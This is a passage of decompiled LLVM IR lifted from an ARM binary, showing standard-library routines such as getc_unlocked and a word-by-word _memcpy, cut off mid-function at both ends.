  uselistorder label %dec_label_pc_1728c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17204, { 2, 0, 1 }
  uselistorder label %dec_label_pc_171d8, { 1, 0 }
  uselistorder label %.thread49, { 1, 0 }
  uselistorder label %dec_label_pc_171b0, { 1, 0 }
  uselistorder label %dec_label_pc_1718c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17170, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1713c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17138, { 0, 2, 1 }
  uselistorder label %dec_label_pc_17094, { 1, 0 }
  uselistorder label %bb257, { 1, 0 }
  uselistorder label %dec_label_pc_17084, { 1, 0 }
  uselistorder label %dec_label_pc_17078, { 1, 0 }
  uselistorder label %bb251, { 1, 0 }
  uselistorder label %bb249, { 1, 0 }
  uselistorder label %bb247, { 1, 0 }
  uselistorder label %.thread162, { 1, 0 }
  uselistorder label %bb243, { 1, 0 }
  uselistorder label %bb241, { 1, 0 }
  uselistorder label %.preheader, { 3, 1, 0, 2 }
  uselistorder label %bb238, { 1, 0 }
  uselistorder label %dec_label_pc_16f98, { 2, 1, 0 }
  uselistorder label %bb235, { 2, 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_16ec0, { 1, 0 }
  uselistorder label %dec_label_pc_16e80, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_16d10, { 1, 0 }
  uselistorder label %dec_label_pc_16c2c, { 1, 0 }
  uselistorder label %bb224, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_17370:
  %v0_17384 = load i1, i1* @cpsr_n, align 1
  br i1 %v0_17384, label %bb, label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_17370
  %v0_17390.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17390.pr, label %bb7, label %.thread2

bb:                                               ; preds = %dec_label_pc_17370
  %v1_17388 = load i32, i32* @r4, align 4
  %v3_17388 = xor i32 %v1_17388, %arg1
  %v2_1738c = sub i32 -1, %v3_17388
  %v4_1738c = icmp eq i32 %v3_17388, -1
  br i1 %v4_1738c, label %bb7, label %.thread2

bb7:                                              ; preds = %thread-pre-split, %bb
  %v7_173945 = phi i32 [ %v2_1738c, %bb ], [ %arg1, %thread-pre-split ]
  br label %.thread2

.thread2:                                         ; preds = %bb, %thread-pre-split, %bb7
  %v7_17394 = phi i32 [ %v2_1738c, %bb ], [ %arg1, %thread-pre-split ], [ %v7_173945, %bb7 ]
  ret i32 %v7_17394

; uselistorder directives
  uselistorder i32 %v2_1738c, { 1, 0 }
  uselistorder i32 %v3_17388, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @getc_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-9 = alloca i8, align 1
  %stack_var_-8 = alloca i32, align 4
  %v3_17398 = load i32, i32* @r4, align 4
  store i32 %v3_17398, i32* %stack_var_-8, align 4
  %v0_1739c = load i32, i32* @r0, align 4
  %v1_1739c = add i32 %v0_1739c, 16
  %v2_1739c = inttoptr i32 %v1_1739c to i32*
  %v3_1739c = load i32, i32* %v2_1739c, align 4
  store i32 %v3_1739c, i32* %r2.global-to-local, align 4
  %v1_173a0 = add i32 %v0_1739c, 24
  %v2_173a0 = inttoptr i32 %v1_173a0 to i32*
  %v3_173a0 = load i32, i32* %v2_173a0, align 4
  %v3_173a4 = icmp ult i32 %v3_1739c, %v3_173a0
  store i32 %v0_1739c, i32* @r4, align 4
  br i1 %v3_173a4, label %bb, label %dec_label_pc_173bc

bb:                                               ; preds = %entry
  %v2_173ac = inttoptr i32 %v3_1739c to i8*
  %v3_173ac = load i8, i8* %v2_173ac, align 1
  %v4_173ac = zext i8 %v3_173ac to i32
  store i32 %v4_173ac, i32* %r0.global-to-local, align 4
  %v6_173ac = add i32 %v3_1739c, 1
  store i32 %v6_173ac, i32* %r2.global-to-local, align 4
  store i32 %v6_173ac, i32* %v2_1739c, align 4
  br label %dec_label_pc_174bc

dec_label_pc_173bc:                               ; preds = %entry
  %v1_173bc = inttoptr i32 %v0_1739c to i8*
  %v2_173bc = load i8, i8* %v1_173bc, align 1
  %v3_173bc = zext i8 %v2_173bc to i32
  %v1_173c0 = and i32 %v3_173bc, 131
  %tmp22 = icmp ugt i32 %v1_173c0, 128
  br i1 %tmp22, label %dec_label_pc_173dc, label %dec_label_pc_173cc

dec_label_pc_173cc:                               ; preds = %dec_label_pc_173bc
  store i32 128, i32* @r1, align 4
  %v0_173d0 = call i32 @__stdio_trans2r_o()
  store i32 %v0_173d0, i32* %r0.global-to-local, align 4
  %v2_173d4 = icmp eq i32 %v0_173d0, 0
  br i1 %v2_173d4, label %dec_label_pc_173cc.dec_label_pc_173dc_crit_edge, label %dec_label_pc_174b8

dec_label_pc_173cc.dec_label_pc_173dc_crit_edge:  ; preds = %dec_label_pc_173cc
  %v0_173dc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_173dc

dec_label_pc_173dc:                               ; preds = %dec_label_pc_173cc.dec_label_pc_173dc_crit_edge, %dec_label_pc_173bc
  %v2_17428 = phi i32 [ %v0_173dc.pre, %dec_label_pc_173cc.dec_label_pc_173dc_crit_edge ], [ %v0_1739c, %dec_label_pc_173bc ]
  %v1_173dc = inttoptr i32 %v2_17428 to i8*
  %v2_173dc = load i8, i8* %v1_173dc, align 1
  %v3_173dc = zext i8 %v2_173dc to i32
  store i32 %v3_173dc, i32* %r2.global-to-local, align 4
  %v1_173e0 = add i32 %v2_17428, 1
  %v2_173e0 = inttoptr i32 %v1_173e0 to i8*
  %v3_173e0 = load i8, i8* %v2_173e0, align 1
  %v4_173e0 = zext i8 %v3_173e0 to i32
  %v4_173e4 = mul nuw nsw i32 %v4_173e0, 256
  %v5_173e4 = or i32 %v4_173e4, %v3_173dc
  store i32 %v5_173e4, i32* %r2.global-to-local, align 4
  %v1_173e8 = and i32 %v3_173dc, 2
  %v2_173e8 = icmp eq i32 %v1_173e8, 0
  br i1 %v2_173e8, label %dec_label_pc_17418, label %dec_label_pc_173f0

dec_label_pc_173f0:                               ; preds = %dec_label_pc_173dc
  %tmp23 = urem i8 %v2_173dc, 2
  %v1_173f0 = zext i8 %tmp23 to i32
  %tmp18 = sub nsw i32 0, %v1_173f0
  %v4_173f4 = and i32 %tmp18, 4
  %v5_173f4 = add i32 %v4_173f4, %v2_17428
  %v1_173f8 = add i32 %v5_173f4, 36
  %v2_173f8 = inttoptr i32 %v1_173f8 to i8*
  %v3_173f8 = load i8, i8* %v2_173f8, align 1
  %v4_173f8 = zext i8 %v3_173f8 to i32
  %v1_173fc = add nsw i32 %v5_173e4, -1
  store i32 %v1_173fc, i32* %r2.global-to-local, align 4
  %v3_17400 = sdiv i32 %v1_173fc, 256
  store i32 %v3_17400, i32* %r1.global-to-local, align 4
  store i32 %v4_173f8, i32* %r0.global-to-local, align 4
  %v2_1740c = add i32 %v2_17428, 40
  %v3_1740c = inttoptr i32 %v2_1740c to i32*
  store i32 0, i32* %v3_1740c, align 4
  %v0_17410 = load i32, i32* %r1.global-to-local, align 4
  %v1_17410 = trunc i32 %v0_17410 to i8
  %v2_17410 = load i32, i32* @r4, align 4
  %v3_17410 = add i32 %v2_17410, 1
  %v4_17410 = inttoptr i32 %v3_17410 to i8*
  store i8 %v1_17410, i8* %v4_17410, align 1
  br label %dec_label_pc_1744c

dec_label_pc_17418:                               ; preds = %dec_label_pc_173dc
  %v1_17418 = add i32 %v2_17428, 16
  store i32 %v1_17418, i32* %r1.global-to-local, align 4
  %v1_1741c = inttoptr i32 %v1_17418 to i32*
  %v2_1741c = load i32, i32* %v1_1741c, align 4
  store i32 %v2_1741c, i32* %r1.global-to-local, align 4
  %v3_1741c = add i32 %v2_17428, 20
  %v4_1741c = inttoptr i32 %v3_1741c to i32*
  %v5_1741c = load i32, i32* %v4_1741c, align 4
  %v9_17420 = icmp eq i32 %v5_1741c, %v2_1741c
  br i1 %v9_17420, label %dec_label_pc_17430, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_17418
  %v2_17424 = inttoptr i32 %v2_1741c to i8*
  %v3_17424 = load i8, i8* %v2_17424, align 1
  %v4_17424 = zext i8 %v3_17424 to i32
  store i32 %v4_17424, i32* %r0.global-to-local, align 4
  %v6_17424 = add i32 %v2_1741c, 1
  store i32 %v6_17424, i32* %r1.global-to-local, align 4
  store i32 %v6_17424, i32* %v1_1741c, align 4
  br label %dec_label_pc_174bc

dec_label_pc_17430:                               ; preds = %dec_label_pc_17418
  %v1_17430 = add i32 %v2_17428, 4
  %v2_17430 = inttoptr i32 %v1_17430 to i32*
  %v3_17430 = load i32, i32* %v2_17430, align 4
  %v4_17438 = icmp eq i32 %v3_17430, -2
  br i1 %v4_17438, label %dec_label_pc_1743c, label %dec_label_pc_17454

dec_label_pc_1743c:                               ; preds = %dec_label_pc_17430
  %v1_1743c = or i32 %v5_173e4, 4
  store i32 %v1_1743c, i32* %r2.global-to-local, align 4
  store i8 %v3_173e0, i8* %v2_173e0, align 1
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1744c

dec_label_pc_1744c:                               ; preds = %dec_label_pc_173f0, %dec_label_pc_1743c
  %v0_1744c = load i32, i32* %r2.global-to-local, align 4
  %v1_1744c = trunc i32 %v0_1744c to i8
  %v2_1744c = load i32, i32* @r4, align 4
  %v3_1744c = inttoptr i32 %v2_1744c to i8*
  store i8 %v1_1744c, i8* %v3_1744c, align 1
  br label %dec_label_pc_174bc

dec_label_pc_17454:                               ; preds = %dec_label_pc_17430
  %v1_17454 = and i32 %v4_173e4, 768
  %v2_17454 = icmp eq i32 %v1_17454, 0
  br i1 %v2_17454, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_17454
  store i32 ptrtoint (i32** @global_var_2d2a8.1026 to i32), i32* %r0.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_17454, %bb19
  store i32 95328, i32* @lr, align 4
  %v1_1745c = xor i1 %v2_17454, true
  call void @__pseudo_cond_branch(i1 %v1_1745c, i32 ptrtoint (i32* @global_var_13aa0.1285 to i32))
  %v0_17460 = load i32, i32* @r4, align 4
  %v1_17460 = add i32 %v0_17460, 8
  store i32 %v1_17460, i32* %r2.global-to-local, align 4
  %v1_17464 = inttoptr i32 %v1_17460 to i32*
  %v2_17464 = load i32, i32* %v1_17464, align 4
  store i32 %v2_17464, i32* %r2.global-to-local, align 4
  %v3_17464 = add i32 %v0_17460, 12
  %v4_17464 = inttoptr i32 %v3_17464 to i32*
  %v5_17464 = load i32, i32* %v4_17464, align 4
  %v9_17468 = icmp eq i32 %v5_17464, %v2_17464
  br i1 %v9_17468, label %dec_label_pc_1749c, label %dec_label_pc_17470

dec_label_pc_17470:                               ; preds = %bb20
  %v2_17470 = add i32 %v0_17460, 24
  %v3_17470 = inttoptr i32 %v2_17470 to i32*
  store i32 %v2_17464, i32* %v3_17470, align 4
  %v0_17474 = load i32, i32* @r4, align 4
  store i32 %v0_17474, i32* %r0.global-to-local, align 4
  %v2_17478 = call i32 @__stdio_rfill(i32 %v0_17474)
  store i32 %v2_17478, i32* %r0.global-to-local, align 4
  %v2_1747c = icmp eq i32 %v2_17478, 0
  br i1 %v2_1747c, label %dec_label_pc_174b8, label %dec_label_pc_17484

dec_label_pc_17484:                               ; preds = %dec_label_pc_17470
  %v0_17484 = load i32, i32* @r4, align 4
  %v1_17484 = add i32 %v0_17484, 20
  %v2_17484 = inttoptr i32 %v1_17484 to i32*
  %v3_17484 = load i32, i32* %v2_17484, align 4
  %v2_17488 = add i32 %v0_17484, 24
  %v3_17488 = inttoptr i32 %v2_17488 to i32*
  store i32 %v3_17484, i32* %v3_17488, align 4
  %v0_1748c = load i32, i32* @r4, align 4
  %v1_1748c = add i32 %v0_1748c, 16
  %v2_1748c = inttoptr i32 %v1_1748c to i32*
  %v3_1748c = load i32, i32* %v2_1748c, align 4
  %v1_17490 = inttoptr i32 %v3_1748c to i8*
  %v2_17490 = load i8, i8* %v1_17490, align 1
  %v3_17490 = zext i8 %v2_17490 to i32
  store i32 %v3_17490, i32* %r0.global-to-local, align 4
  %v5_17490 = add i32 %v3_1748c, 1
  store i32 %v5_17490, i32* %v2_1748c, align 4
  br label %dec_label_pc_174bc

dec_label_pc_1749c:                               ; preds = %bb20
  %v1_1749c = inttoptr i32 %v0_17460 to i8*
  store i32 %v0_17460, i32* %r0.global-to-local, align 4
  %v2_174a0 = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_174a0, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_174a8 = call i32 @__stdio_READ(i8* %v1_1749c, i32 %v2_174a0, i32 1)
  store i32 %v5_174a8, i32* %r0.global-to-local, align 4
  %v2_174ac = icmp eq i32 %v5_174a8, 0
  br i1 %v2_174ac, label %dec_label_pc_174b8, label %bb21

bb21:                                             ; preds = %dec_label_pc_1749c
  %v4_174b0 = load i8, i8* %stack_var_-9, align 1
  %v5_174b0 = sext i8 %v4_174b0 to i32
  store i32 %v5_174b0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_174bc

dec_label_pc_174b8:                               ; preds = %dec_label_pc_1749c, %dec_label_pc_173cc, %dec_label_pc_17470
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_174bc

dec_label_pc_174bc:                               ; preds = %bb, %bb21, %.thread4, %dec_label_pc_17484, %dec_label_pc_1744c, %dec_label_pc_174b8
  %v2_174c0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_174c0, i32* @r4, align 4
  %v8_174c0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_174c0

; uselistorder directives
  uselistorder i32 %v2_1741c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_173dc, { 1, 0, 2 }
  uselistorder i32 %v2_17428, { 1, 3, 2, 4, 0, 6, 5 }
  uselistorder i32 %v3_1739c, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-9, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i8** @global_var_2d2e0.991, { 2, 1, 0 }
  uselistorder i32** @global_var_2d2a8.1026, { 0, 2, 1 }
  uselistorder label %dec_label_pc_174bc, { 5, 1, 3, 4, 2, 0 }
  uselistorder label %dec_label_pc_174b8, { 0, 2, 1 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_1744c, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_174d0 = load i32, i32* @r1, align 4
  %v1_174d0 = load i32, i32* %r0.global-to-local, align 4
  %v2_174d0 = sub i32 %v0_174d0, %v1_174d0
  %v3_174d0 = icmp ult i32 %v0_174d0, %v1_174d0
  %v4_174d0 = xor i32 %v1_174d0, %v0_174d0
  %v5_174d0 = xor i32 %v2_174d0, %v0_174d0
  %v6_174d0 = and i32 %v5_174d0, %v4_174d0
  %v7_174d0 = icmp slt i32 %v6_174d0, 0
  store i1 %v7_174d0, i1* %cpsr_v.global-to-local, align 1
  %v8_174d0 = icmp slt i32 %v2_174d0, 0
  store i1 %v8_174d0, i1* %cpsr_n.global-to-local, align 1
  %v9_174d0 = icmp eq i32 %v0_174d0, %v1_174d0
  store i1 %v9_174d0, i1* @cpsr_z, align 1
  br i1 %v3_174d0, label %dec_label_pc_1771c, label %dec_label_pc_174d8

dec_label_pc_174d8:                               ; preds = %entry
  br i1 %v9_174d0, label %.thread122, label %bb

.thread122:                                       ; preds = %bb145, %.thread121, %bb142, %dec_label_pc_174d8
  %merge = phi i32 [ %v0_174d0, %dec_label_pc_174d8 ], [ %v2_177b0, %bb142 ], [ %v11_177cc, %bb145 ], [ %v7_177cc, %.thread121 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_174d8
  %v5_174dc = inttoptr i32 %v1_174d0 to i8*
  store i8* %v5_174dc, i8** %stack_var_-8, align 4
  %v0_174e0 = load i32, i32* @r2, align 4
  %v2_174e0 = add i32 %v0_174e0, -4
  store i32 %v2_174e0, i32* %r2.global-to-local, align 4
  %v4_174e0 = sub i32 3, %v0_174e0
  %v5_174e0 = and i32 %v4_174e0, %v0_174e0
  %v6_174e0 = icmp slt i32 %v5_174e0, 0
  store i1 %v6_174e0, i1* %cpsr_v.global-to-local, align 1
  %v7_174e0 = icmp slt i32 %v2_174e0, 0
  store i1 %v7_174e0, i1* %cpsr_n.global-to-local, align 1
  %v5_174e4 = icmp slt i32 %v0_174e0, 4
  br i1 %v5_174e4, label %bb132, label %dec_label_pc_174e8

dec_label_pc_174e8:                               ; preds = %bb
  %v1_174e8 = urem i32 %v1_174d0, 4
  store i32 %v1_174e8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_174e8 = icmp eq i32 %v1_174e8, 0
  br i1 %v2_174e8, label %dec_label_pc_174f0, label %dec_label_pc_17594

dec_label_pc_174f0:                               ; preds = %dec_label_pc_174e8
  %v1_174f0 = urem i32 %v0_174d0, 4
  store i32 %v1_174f0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_174f0 = icmp eq i32 %v1_174f0, 0
  %extract.t = trunc i32 %v0_174d0 to i2
  br i1 %v2_174f0, label %dec_label_pc_174f8, label %dec_label_pc_175c4

dec_label_pc_174f8:                               ; preds = %dec_label_pc_174f0, %dec_label_pc_175bc
  %v0_1751092 = phi i32 [ %v1_174d0, %dec_label_pc_174f0 ], [ %v0_1760c75, %dec_label_pc_175bc ]
  %v0_1750c91 = phi i32 [ %v0_174d0, %dec_label_pc_174f0 ], [ %v0_175bc, %dec_label_pc_175bc ]
  %v0_174f8 = phi i32 [ %v2_174e0, %dec_label_pc_174f0 ], [ %v2_175b4, %dec_label_pc_175bc ]
  %v2_174f8 = add i32 %v0_174f8, -8
  store i32 %v2_174f8, i32* %r2.global-to-local, align 4
  %v4_174f8 = sub i32 7, %v0_174f8
  %v5_174f8 = and i32 %v4_174f8, %v0_174f8
  %v6_174f8 = icmp slt i32 %v5_174f8, 0
  store i1 %v6_174f8, i1* %cpsr_v.global-to-local, align 1
  %v7_174f8 = icmp slt i32 %v2_174f8, 0
  store i1 %v7_174f8, i1* %cpsr_n.global-to-local, align 1
  %v5_174fc = icmp slt i32 %v0_174f8, 8
  br i1 %v5_174fc, label %dec_label_pc_1754c, label %dec_label_pc_17500

dec_label_pc_17500:                               ; preds = %dec_label_pc_174f8
  %v2_17500 = add i32 %v0_174f8, -28
  store i32 %v2_17500, i32* %r2.global-to-local, align 4
  %v4_17500 = sub i32 27, %v0_174f8
  %v5_17500 = and i32 %v4_17500, %v2_174f8
  %v6_17500 = icmp slt i32 %v5_17500, 0
  store i1 %v6_17500, i1* %cpsr_v.global-to-local, align 1
  %v7_17500 = icmp slt i32 %v2_17500, 0
  store i1 %v7_17500, i1* %cpsr_n.global-to-local, align 1
  %v5_17504 = icmp slt i32 %v2_174f8, 20
  br i1 %v5_17504, label %dec_label_pc_17538, label %dec_label_pc_17508

dec_label_pc_17508:                               ; preds = %dec_label_pc_17500
  %v0_17508 = load i32, i32* @r4, align 4
  store i32 %v0_17508, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1750c

dec_label_pc_1750c:                               ; preds = %dec_label_pc_1750c.dec_label_pc_1750c_crit_edge, %dec_label_pc_17508
  %v0_17510 = phi i32 [ %v12_17518, %dec_label_pc_1750c.dec_label_pc_1750c_crit_edge ], [ %v0_1751092, %dec_label_pc_17508 ]
  %v0_1750c = phi i32 [ %v0_1750c.pre, %dec_label_pc_1750c.dec_label_pc_1750c_crit_edge ], [ %v0_1750c91, %dec_label_pc_17508 ]
  %v1_1750c = inttoptr i32 %v0_1750c to i32*
  %v2_1750c = load i32, i32* %v1_1750c, align 4
  store i32 %v2_1750c, i32* %r3.global-to-local, align 4
  %v3_1750c = add i32 %v0_1750c, 4
  %v4_1750c = inttoptr i32 %v3_1750c to i32*
  %v5_1750c = load i32, i32* %v4_1750c, align 4
  store i32 %v5_1750c, i32* %r4.global-to-local, align 4
  %v6_1750c = add i32 %v0_1750c, 8
  %v7_1750c = inttoptr i32 %v6_1750c to i32*
  %v8_1750c = load i32, i32* %v7_1750c, align 4
  store i32 %v8_1750c, i32* %ip.global-to-local, align 4
  %v9_1750c = add i32 %v0_1750c, 12
  %v10_1750c = inttoptr i32 %v9_1750c to i32*
  %v11_1750c = load i32, i32* %v10_1750c, align 4
  store i32 %v11_1750c, i32* %lr.global-to-local, align 4
  %v12_1750c = add i32 %v0_1750c, 16
  store i32 %v12_1750c, i32* %r1.global-to-local, align 4
  %v1_17510 = inttoptr i32 %v0_17510 to i32*
  store i32 %v2_1750c, i32* %v1_17510, align 4
  %v3_17510 = add i32 %v0_17510, 4
  %v4_17510 = inttoptr i32 %v3_17510 to i32*
  %v5_17510 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17510, i32* %v4_17510, align 4
  %v6_17510 = add i32 %v0_17510, 8
  %v7_17510 = inttoptr i32 %v6_17510 to i32*
  %v8_17510 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_17510, i32* %v7_17510, align 4
  %v9_17510 = add i32 %v0_17510, 12
  %v10_17510 = inttoptr i32 %v9_17510 to i32*
  %v11_17510 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_17510, i32* %v10_17510, align 4
  %v12_17510 = add i32 %v0_17510, 16
  store i32 %v12_17510, i32* %r0.global-to-local, align 4
  %v0_17514 = load i32, i32* %r1.global-to-local, align 4
  %v1_17514 = inttoptr i32 %v0_17514 to i32*
  %v2_17514 = load i32, i32* %v1_17514, align 4
  store i32 %v2_17514, i32* %r3.global-to-local, align 4
  %v3_17514 = add i32 %v0_17514, 4
  %v4_17514 = inttoptr i32 %v3_17514 to i32*
  %v5_17514 = load i32, i32* %v4_17514, align 4
  store i32 %v5_17514, i32* %r4.global-to-local, align 4
  %v6_17514 = add i32 %v0_17514, 8
  %v7_17514 = inttoptr i32 %v6_17514 to i32*
  %v8_17514 = load i32, i32* %v7_17514, align 4
  store i32 %v8_17514, i32* @ip, align 4
  %v9_17514 = add i32 %v0_17514, 12
  %v10_17514 = inttoptr i32 %v9_17514 to i32*
  %v11_17514 = load i32, i32* %v10_17514, align 4
  store i32 %v11_17514, i32* @lr, align 4
  %v12_17514 = add i32 %v0_17514, 16
  store i32 %v12_17514, i32* @r1, align 4
  %v1_17518 = inttoptr i32 %v12_17510 to i32*
  store i32 %v2_17514, i32* %v1_17518, align 4
  %v3_17518 = add i32 %v0_17510, 20
  %v4_17518 = inttoptr i32 %v3_17518 to i32*
  %v5_17518 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17518, i32* %v4_17518, align 4
  %v6_17518 = add i32 %v0_17510, 24
  %v7_17518 = inttoptr i32 %v6_17518 to i32*
  %v8_17518 = load i32, i32* @ip, align 4
  store i32 %v8_17518, i32* %v7_17518, align 4
  %v9_17518 = add i32 %v0_17510, 28
  %v10_17518 = inttoptr i32 %v9_17518 to i32*
  %v11_17518 = load i32, i32* @lr, align 4
  store i32 %v11_17518, i32* %v10_17518, align 4
  %v12_17518 = add i32 %v0_17510, 32
  store i32 %v12_17518, i32* %r0.global-to-local, align 4
  %v0_1751c = load i32, i32* %r2.global-to-local, align 4
  %v2_1751c = add i32 %v0_1751c, -32
  store i32 %v2_1751c, i32* %r2.global-to-local, align 4
  %v6_17520 = icmp slt i32 %v0_1751c, 32
  br i1 %v6_17520, label %dec_label_pc_17524, label %dec_label_pc_1750c.dec_label_pc_1750c_crit_edge

dec_label_pc_1750c.dec_label_pc_1750c_crit_edge:  ; preds = %dec_label_pc_1750c
  %v0_1750c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1750c

dec_label_pc_17524:                               ; preds = %dec_label_pc_1750c
  %v4_17524 = add i32 %v0_1751c, -16
  %v6_17524 = add i32 %v0_1751c, 2147483616
  %v7_17524 = and i32 %v4_17524, %v6_17524
  %v8_17524 = icmp slt i32 %v7_17524, 0
  store i1 %v8_17524, i1* %cpsr_v.global-to-local, align 1
  %v9_17524 = icmp slt i32 %v4_17524, 0
  store i1 %v9_17524, i1* %cpsr_n.global-to-local, align 1
  %v5_17528 = icmp slt i32 %v2_1751c, -16
  br i1 %v5_17528, label %.thread1, label %bb129

bb129:                                            ; preds = %dec_label_pc_17524
  %v6_17528 = load i32, i32* @r1, align 4
  %v7_17528 = inttoptr i32 %v6_17528 to i32*
  %v8_17528 = load i32, i32* %v7_17528, align 4
  store i32 %v8_17528, i32* %r3.global-to-local, align 4
  %v9_17528 = add i32 %v6_17528, 4
  %v10_17528 = inttoptr i32 %v9_17528 to i32*
  %v11_17528 = load i32, i32* %v10_17528, align 4
  store i32 %v11_17528, i32* %r4.global-to-local, align 4
  %v12_17528 = add i32 %v6_17528, 8
  %v13_17528 = inttoptr i32 %v12_17528 to i32*
  %v14_17528 = load i32, i32* %v13_17528, align 4
  store i32 %v14_17528, i32* @ip, align 4
  %v15_17528 = add i32 %v6_17528, 12
  %v16_17528 = inttoptr i32 %v15_17528 to i32*
  %v17_17528 = load i32, i32* %v16_17528, align 4
  store i32 %v17_17528, i32* @lr, align 4
  %v18_17528 = add i32 %v6_17528, 16
  store i32 %v18_17528, i32* @r1, align 4
  %v7_1752c = inttoptr i32 %v12_17518 to i32*
  store i32 %v8_17528, i32* %v7_1752c, align 4
  %v9_1752c = add i32 %v0_17510, 36
  %v10_1752c = inttoptr i32 %v9_1752c to i32*
  %v11_1752c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v11_1752c, i32* %v10_1752c, align 4
  %v12_1752c = add i32 %v0_17510, 40
  %v13_1752c = inttoptr i32 %v12_1752c to i32*
  %v14_1752c = load i32, i32* @ip, align 4
  store i32 %v14_1752c, i32* %v13_1752c, align 4
  %v15_1752c = add i32 %v0_17510, 44
  %v16_1752c = inttoptr i32 %v15_1752c to i32*
  %v17_1752c = load i32, i32* @lr, align 4
  store i32 %v17_1752c, i32* %v16_1752c, align 4
  %v18_1752c = add i32 %v0_17510, 48
  store i32 %v18_1752c, i32* %r0.global-to-local, align 4
  %v6_17530 = load i32, i32* %r2.global-to-local, align 4
  %v7_17530 = add i32 %v6_17530, -16
  store i32 %v7_17530, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17524, %bb129
  %v3_17540101 = phi i32 [ %v12_17518, %dec_label_pc_17524 ], [ %v18_1752c, %bb129 ]
  %v0_1753895 = phi i32 [ %v2_1751c, %dec_label_pc_17524 ], [ %v7_17530, %bb129 ]
  %v2_17534 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17534, i32* @r4, align 4
  br label %dec_label_pc_17538

dec_label_pc_17538:                               ; preds = %dec_label_pc_17500, %.thread1
  %v3_17540100 = phi i32 [ %v0_1751092, %dec_label_pc_17500 ], [ %v3_17540101, %.thread1 ]
  %v0_17538 = phi i32 [ %v2_17500, %dec_label_pc_17500 ], [ %v0_1753895, %.thread1 ]
  %v1_17538 = add i32 %v0_17538, 20
  store i32 %v1_17538, i32* %r2.global-to-local, align 4
  %v3_17538 = sub i32 0, %v0_17538
  %v4_17538 = and i32 %v1_17538, %v3_17538
  %v5_17538 = icmp slt i32 %v4_17538, 0
  store i1 %v5_17538, i1* %cpsr_v.global-to-local, align 1
  %v6_17538 = icmp slt i32 %v1_17538, 0
  store i1 %v6_17538, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_1753c

dec_label_pc_1753c:                               ; preds = %.thread117, %dec_label_pc_17538
  %v0_1754c.pre148 = phi i32 [ %v0_1754c.pre, %.thread117 ], [ %v1_17538, %dec_label_pc_17538 ]
  %v3_17540 = phi i32 [ %v3_1754098118, %.thread117 ], [ %v3_17540100, %dec_label_pc_17538 ]
  %v1_17544 = phi i1 [ %v1_17548, %.thread117 ], [ %v5_17538, %dec_label_pc_17538 ]
  %v0_17544 = phi i1 [ %v0_17548, %.thread117 ], [ %v6_17538, %dec_label_pc_17538 ]
  %v2_1753c = xor i1 %v1_17544, %v0_17544
  br i1 %v2_1753c, label %.thread117, label %bb130

bb130:                                            ; preds = %dec_label_pc_1753c
  %v3_1753c = load i32, i32* @r1, align 4
